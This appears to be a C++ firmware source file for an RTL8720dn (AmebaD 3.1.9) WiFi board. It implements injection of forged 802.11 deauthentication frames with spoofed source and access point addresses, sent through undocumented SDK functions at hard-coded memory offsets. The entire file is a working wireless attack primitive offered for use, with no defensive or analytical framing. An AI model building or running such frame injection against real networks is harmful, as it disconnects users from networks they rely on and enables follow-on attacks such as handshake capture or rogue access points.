/* SPDX-License-Identifier: GPL-3.0-or-later
 * Raw frame bridge adapted from tesa-klebeband/RTL8720dn-WiFi-Packet-Injection
 * commit 8e722c79cbe08f2ff23eb4e428290de9ecb171a6, packet-injection.cpp/.h.
 * https://github.com/tesa-klebeband/RTL8720dn-WiFi-Packet-Injection
 * See LICENSE and THIRD_PARTY.md. This adapter requires AmebaD 3.1.9.
 * Existing v4 deauth format and vendor management-frame helpers are retained.
 */
#include "radio_amebad_319.h"
#include <Arduino.h>
#include <string.h>
extern uint8_t* rltk_wlan_info;
extern "C" void* alloc_mgtxmitframe(void* ptr);
extern "C" void update_mgntframe_attrib(void* ptr, void* frame_control);
extern "C" int dump_mgntframe(void* ptr, void* frame_control);

struct DeauthFrame {
    uint16_t frame_control, duration;
    uint8_t destination[6], source[6], access_point[6];
    uint16_t sequence_number, reason;
};
static_assert(sizeof(DeauthFrame) == 26, "Unexpected deauth frame layout");

void bwn_radio_deauth(const uint8_t source[6], const uint8_t destination[6], uint16_t reason) {
    DeauthFrame frame = {};
    frame.frame_control = 0x00c0; frame.duration = 0xffff; frame.reason = reason;
    memcpy(frame.source, source, 6); memcpy(frame.access_point, source, 6);
    memcpy(frame.destination, destination, 6);
    /* Offsets correspond exclusively to the pinned AmebaD 3.1.9 SDK. */
    uint8_t* adapter = (uint8_t*)**(uint32_t**)(rltk_wlan_info + 0x10);
    uint8_t* control = (uint8_t*)alloc_mgtxmitframe(adapter + 0xa80);
    if(!control) return;
    update_mgntframe_attrib(adapter, control + 8);
    memset((void*)*(uint32_t*)(control + 0x80), 0, 0x68);
    uint8_t* data = (uint8_t*)*(uint32_t*)(control + 0x80) + 0x28;
    memcpy(data, &frame, sizeof(frame));
    *(uint32_t*)(control + 0x14) = sizeof(frame);
    *(uint32_t*)(control + 0x18) = sizeof(frame);
    dump_mgntframe(adapter, control);
}
